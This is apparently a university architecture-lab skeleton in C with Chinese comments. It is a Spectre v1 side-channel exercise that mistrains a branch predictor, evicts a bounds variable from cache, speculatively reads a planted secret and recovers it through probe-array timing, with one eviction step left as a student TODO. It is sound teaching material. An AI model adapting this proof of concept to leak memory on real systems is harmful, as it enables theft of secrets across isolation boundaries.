/* predictor_lab/Q4/bench.c
 *
 * Q4: Spectre v1 — Speculative Execution Side-Channel — Question 6
 * ─────────────────────────────────────────────────────────────────────────
 *
 * 标准 Spectre v1 攻击原理：
 *
 *   1. 训练分支预测器：用合法索引反复调用 gadget，使预测器对
 *      "idx < array_size" 分支形成"强 taken"状态。
 *
 *   2. 将 array_size 从 L1 和 L2 完全驱逐（需要 >256KB 的驱逐缓冲）。
 *      此后访问 array_size 需要 DRAM（~40 周期）。
 *
 *   3. 攻击调用 gadget(LEN)：idx = LEN 越界，分支实际应为 NOT-TAKEN，
 *      但预测器预测 TAKEN。由于 array_size 在 DRAM，分支 EX 延迟 ~40 周期。
 *      在此期间，OOO 投机执行 if-body：
 *        val  = mem.arr[LEN]  = mem.secret = 'S'   （仅依赖 idx，立即发射）
 *        probe_array[val*64]  从 L2 取入 L1（~8 周期）
 *      两个投机 LOAD 在分支 EX（~40 周期后）之前均已完成 MEM 阶段。
 *
 *   4. 分支解析 NOT-TAKEN → ooo_flush_after()。
 *      缓存状态不回滚：probe_array['S'*64] 仍在 L1。
 *
 *   5. Reload：逐一测量 probe_array[i*64] 的访问时间。
 *      L1 命中（~1 周期）的条目 i 即为泄漏的 secret 值。
 *
 * 关键时序（ooo_stage_mem 先于 ooo_stage_ex 执行）：
 *   投机 LOAD MEM 完成（~8 周期）< 分支 EX（array_size DRAM ~40 周期）
 *   因此缓存污染在 flush 之前已发生。
 */

#include "csr_perf.h"

typedef unsigned long size_t;

#define UART_THR (*(volatile char *)0xa00003f8)
static void uart_putchar(char c) { UART_THR = c; }
static void uart_puts(const char *s) { while (*s) uart_putchar(*s++); }
static void uart_putlong(long v) {
    if (v < 0) { uart_putchar('-'); v = -v; }
    if (v >= 10) uart_putlong(v / 10);
    uart_putchar('0' + (int)(v % 10));
}
static void uart_putchar_safe(char c) {
    if (c >= 32 && c < 127) uart_putchar(c);
    else uart_putchar('?');
}

/* ── 实验参数 ──────────────────────────────────────────────────────────── */

#define LEN         16      /* victim_array 合法范围：[0, LEN) */
#define STRIDE      64      /* = BLOCK_SIZE，每个 probe 条目独占一条 cache 行 */
#define PROBE_ELEMS 256     /* 每个可能的 byte 值对应一条 cache 行 */

/* 驱逐缓冲大小：
 *   L1D = 32KB  → 驱逐 probe_array 出 L1
 *   L2  = 256KB → 驱逐 array_size  出 L2（需要比 L2 大）
 *   使用 512KB，足以驱逐 L2 中的任意 cache line。 */
#define L1_EVICT_SIZE  (32  * 1024)
#define L2_EVICT_SIZE  (512 * 1024)

/* ── 内存布局 ─────────────────────────────────────────────────────────── */

/* mem.arr[0..LEN-1]：合法访问范围
 * mem.secret：紧跟在 arr 之后，越界可读到它 */
static struct {
    char arr[LEN];
    char secret;
} mem;

/* probe_array：256 条 cache 行，每个 byte 值（0-255）对应一条 */
static char probe_array[PROBE_ELEMS * STRIDE];

/* l1_evict_buf：32KB，用于将 probe_array 驱逐出 L1 */
static char l1_evict_buf[L1_EVICT_SIZE];

/* l2_evict_buf：512KB，用于将 array_size 驱逐出 L2 */
static char l2_evict_buf[L2_EVICT_SIZE];

/* ── 关键：array_size 是分支的边界变量，将被驱逐至 DRAM ─────────────── */
static volatile size_t array_size = LEN;

/* ── spectre_gadget：标准 Spectre v1 gadget ───────────────────────────── */
__attribute__((noinline))
static void spectre_gadget(size_t idx) {
    if (idx < array_size) {                          /* bounds check: array_size → DRAM miss */
        unsigned char val = (unsigned char)mem.arr[idx]; /* speculative LOAD 1 */
        probe_array[(size_t)val * STRIDE] += 1;          /* speculative LOAD 2 / cache side-channel */
    }
}

/* ── warmup_probe_l2：将所有 probe_array 条目预热到 L2 ──────────────── */
static void warmup_probe_l2(void) {
    volatile char sink = 0;
    for (int i = 0; i < PROBE_ELEMS; i++)
        sink += probe_array[(size_t)i * STRIDE];
    (void)sink;
}

/* ── flush_probe_from_l1：用 32KB 驱逐缓冲将 probe_array 从 L1 逐出 ── */
static void flush_probe_from_l1(void) {
    volatile char *p = (volatile char *)l1_evict_buf;
    for (int i = 0; i < L1_EVICT_SIZE; i += STRIDE)
        p[i] += 1;
}

/* ── flush_array_size_from_cache：用 512KB 驱逐 array_size 出 L2 ─────
 * 访问量 >> L2（256KB），确保 array_size 所在 cache line 被替换至 DRAM。 */
static void flush_array_size_from_cache(void) {
    volatile char *p = (volatile char *)l2_evict_buf;
    for (int i = 0; i < L2_EVICT_SIZE; i += STRIDE)
        p[i] += 1;
}

/* ── mistrain：用合法索引训练分支预测器为"强 taken" ─────────────────── */
static void mistrain(void) {
    for (int i = 0; i < 30; i++)
        spectre_gadget((size_t)(i % LEN));   /* idx < LEN 始终为真 → taken */
}

/* ── reload：测量每个 probe_array 条目的访问时间 ──────────────────────── */
static int reload(void) {
    int  best_idx  = -1;
    long best_time = 999;
    for (int i = 0; i < PROBE_ELEMS; i++) {
        long t0 = rdcycle();
        volatile char v = probe_array[(size_t)i * STRIDE];
        long t1 = rdcycle();
        (void)v;
        if (t1 - t0 < best_time) {
            best_time = t1 - t0;
            best_idx  = i;
        }
    }
    return best_idx;
}

/* ── main ─────────────────────────────────────────────────────────────── */
int main(void) {
    /* 初始化 arr 和 secret */
    for (int i = 0; i < LEN; i++)
        mem.arr[i] = (char)(i + 1);
    mem.secret = 'S';   /* 0x53 = 83：攻击目标 */

    uart_puts("=== Q4: Spectre v1 Side-Channel ===\n");
    uart_puts("target: mem.arr[");
    uart_putlong(LEN);
    uart_puts("] = mem.secret (value unknown to attacker)\n");

    /* Step 1: 将所有 probe_array 条目预热到 L2 */
    warmup_probe_l2();

    /* Step 2: 将 probe_array 从 L1 驱逐回 L2 */
    flush_probe_from_l1();

    /* Step 3 & 4: TODO ──────────────────────────────────────────────────────
     *
     * 任务：确保 array_size 在 DRAM（而非 L1/L2），同时保持 probe_array 在 L2。
     *
     * 提示：
     *   - Spectre v1 的投机窗口取决于分支 EX 的延迟。若 array_size 在 L1（1周期）
     *     或 L2（8周期），分支很快解析，投机 LOAD 还没完成 MEM 就被 flush，攻击失败。
     *   - 需要访问 > L2 大小（256KB）的数据，才能把 array_size 所在 cache line 替换。
     *   - 注意：大规模驱逐操作本身也可能把 probe_array 赶出 L2，
     *     因此驱逐后可能还需要重新处理 probe_array 的缓存状态。
     *
     * 目标缓存状态（进入 Step 5 之前）：
     *   - array_size  → DRAM（分支解析需 ~40 周期，给投机 LOAD 足够时间）
     *   - probe_array → L2  （投机 LOAD2 命中 L2 ~8 周期 < 分支 EX ~40 周期）
     *
     * 请在此处填写你的实现：
     * ────────────────────────────────────────────────────────────────────── */

    /* TODO: 你的代码 */

    /* Step 5: 将 mem.arr（含 secret）暖入 L1 */
    {
        volatile char sink = 0;
        for (int i = 0; i <= LEN; i++)
            sink += mem.arr[i];
        (void)sink;
    }

    /* Step 6: 紧前训练 + 攻击
     *   mistrain() 后立刻 spectre_gadget(LEN)，最小化 BTB aliasing 风险。
     *   mistrain 使 if 分支预测强 taken；攻击调用 idx=LEN 越界触发投机执行。 */
    mistrain();
    /* probe_array 被 mistrain 的 += 带入 L1（indices 1..LEN），需再次驱逐 */
    flush_probe_from_l1();
    /* mem.arr 仍在 L1（mistrain 没有驱逐它）*/

    /* Step 7: Spectre 攻击 */
    spectre_gadget((size_t)LEN);

    /* Step 8: Reload — 找出 L1 命中的 probe_array 条目（= secret 的值） */
    int leaked = reload();

    uart_puts("\nResult:\n");
    uart_puts("  leaked byte = ");
    uart_putlong(leaked);
    uart_puts(" ('");
    uart_putchar_safe((char)leaked);
    uart_puts("')\n");
    uart_puts("  actual secret = ");
    uart_putlong((unsigned char)mem.secret);
    uart_puts(" ('");
    uart_putchar_safe(mem.secret);
    uart_puts("')\n");

    if (leaked == (unsigned char)mem.secret)
        uart_puts("  [MATCH] Spectre attack succeeded!\n");
    else
        uart_puts("  [MISS]  Attack failed\n");

    uart_puts("done\n");
    return 0;
}
